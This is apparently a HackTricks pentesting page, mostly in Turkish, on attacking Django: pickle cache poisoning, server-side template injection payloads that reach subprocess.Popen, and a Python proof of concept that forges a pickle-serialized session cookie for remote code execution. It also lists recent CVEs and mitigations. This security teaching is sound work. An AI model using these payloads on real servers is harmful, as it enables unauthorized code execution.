# Django

{{#include ../../banners/hacktricks-training.md}}

## Önbellek Manipülasyonu ile RCE
Django'nun varsayılan cache depolama yöntemi [Python pickles](https://docs.python.org/3/library/pickle.html) olup, [untrusted input is unpickled](https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf) durumunda RCE'ye yol açabilir. **Eğer bir saldırgan cache'e yazma erişimi elde ederse, bu zafiyeti alttaki sunucuda RCE'ye yükseltebilirler**.

Django cache, dört yerden birinde saklanır: [Redis](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/redis.py#L12), [memory](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/locmem.py#L16), [files](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/filebased.py#L16), veya bir [database](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/db.py#L95). Redis sunucusunda veya veritabanında saklanan cache'ler en olası saldırı vektörleridir (Redis injection ve SQL injection), ancak bir saldırgan dosya tabanlı cache'i de keyfi bir yazmayı RCE'ye dönüştürmek için kullanabilir. Bakımcılar bunu önemsiz bir sorun olarak işaretlemişlerdir. Önemli olan, cache dosyası klasörü, SQL tablo adı ve Redis sunucu ayrıntılarının uygulamaya göre değişeceğidir.

Bu HackerOne raporu, SQLite veritabanında saklanan Django cache'inin sömürülebilmesine dair harika ve tekrar üretilebilir bir örnek sunuyor: https://hackerone.com/reports/1415436

---

## Server-Side Template Injection (SSTI)
The Django Template Language (DTL) **Turing-complete**'dir. Eğer kullanıcı kaynaklı veri bir *template string* olarak render edilirse (örneğin `Template(user_input).render()` çağrılarak veya `|safe`/`format_html()` otomatik kaçış(escaping)i kaldırdığında), bir saldırgan tam SSTI → RCE elde edebilir.

### Tespit
1. `Template()` / `Engine.from_string()` / `render_to_string()` gibi çağrılarda *herhangi bir* temizlenmemiş istek verisinin dahil edilip edilmediğine bakın.
2. Zamana dayalı veya aritmetik bir payload gönderin:
```django
{{7*7}}
```
Eğer render edilen çıktı `49` içeriyorsa, girdi şablon motoru tarafından derlenmiştir.

### RCE İçin Primitive
Django doğrudan `__import__` erişimini engelliyor, ancak Python obje grafiğine ulaşılabilir:
```django
{{''.__class__.mro()[1].__subclasses__()}}
```
`subprocess.Popen`'un indeksini bulun (Python build'ine bağlı olarak ≈400–500) ve keyfi komutlar çalıştırın:
```django
{{''.__class__.mro()[1].__subclasses__()[438]('id',shell=True,stdout=-1).communicate()[0]}}
```
Daha güvenli evrensel bir gadget, `cls.__name__ == 'Popen'` olana kadar yinelemektir.

Aynı gadget, kullanıcı girdisini hatalı işleyen **Debug Toolbar** veya **Django-CMS** şablon render özellikleri için de çalışır.

---

### Also see: ReportLab/xhtml2pdf PDF export RCE
Django üzerine kurulmuş uygulamalar genellikle görünümleri PDF olarak dışa aktarmak için xhtml2pdf/ReportLab ile entegre olur. Kullanıcı kontrollü HTML PDF oluşturma akışına girdiğinde, rl_safe_eval üçlü köşeli parantezler `[[[ ... ]]]` içindeki ifadeleri değerlendirebilir ve kod yürütülmesine olanak sağlayabilir (CVE-2023-33733). Detaylar, payloads, and mitigations:

{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/reportlab-xhtml2pdf-triple-brackets-expression-evaluation-rce-cve-2023-33733.md
{{#endref}}

---

## Pickle-Backed Session Cookie RCE
If the setting `SESSION_SERIALIZER = 'django.contrib.sessions.serializers.PickleSerializer'` is enabled (or a custom serializer that deserialises pickle), Django *decrypts and unpickles* the session cookie **before** calling any view code. Therefore, possessing a valid signing key (the project `SECRET_KEY` by default) is enough for immediate remote code execution.

### Exploit Requirements
* The server uses `PickleSerializer`.
* The attacker knows / can guess `settings.SECRET_KEY` (leaks via GitHub, `.env`, error pages, etc.).

### Proof-of-Concept
```python
#!/usr/bin/env python3
from django.contrib.sessions.serializers import PickleSerializer
from django.core import signing
import os, base64

class RCE(object):
def __reduce__(self):
return (os.system, ("id > /tmp/pwned",))

mal = signing.dumps(RCE(), key=b'SECRET_KEY_HERE', serializer=PickleSerializer)
print(f"sessionid={mal}")
```
Ortaya çıkan cookie'yi gönderin; payload WSGI worker'ın izinleriyle çalıştırılır.

**Önlemler**: Varsayılan `JSONSerializer`'ı kullanmaya devam edin, `SECRET_KEY`'i düzenli olarak değiştirin ve `SESSION_COOKIE_HTTPONLY`'ı yapılandırın.

---

## Son (2023-2025) Yüksek Etkili Django CVE'leri — Pentesters'in Kontrol Etmesi Gereken
* **CVE-2025-48432** – *Log Injection via unescaped `request.path`* (4 Haz 2025'te düzeltildi). Saldırganların log dosyalarına yeni satır karakterleri/ANSI kodları sızdırmasına ve sonraki log analizlerini bozmasına izin verir. Yama seviyesi ≥ 4.2.22 / 5.1.10 / 5.2.2.
* **CVE-2024-42005** – *Critical SQL injection* in `QuerySet.values()/values_list()` on `JSONField` (CVSS 9.8). Alıntılamadan çıkmak ve rastgele SQL çalıştırmak için JSON anahtarları oluşturun. Düzeltildi: 4.2.15 / 5.0.8.

Framework'ün tam sürümünü her zaman `X-Frame-Options` hata sayfası veya `/static/admin/css/base.css` hash'i ile tespit edin ve yukarıdakileri uygun olduğunda test edin.

---

## Referanslar
* Django güvenlik sürümü – "Django 5.2.2, 5.1.10, 4.2.22 address CVE-2025-48432" – 4 Haz 2025.
* OP-Innovate: "Django releases security updates to address SQL injection flaw CVE-2024-42005" – 11 Ağu 2024.
* 0xdf: University (HTB) – Exploiting xhtml2pdf/ReportLab CVE-2023-33733 to gain RCE and pivot into AD – [https://0xdf.gitlab.io/2025/08/09/htb-university.html](https://0xdf.gitlab.io/2025/08/09/htb-university.html)

{{#include ../../banners/hacktricks-training.md}}
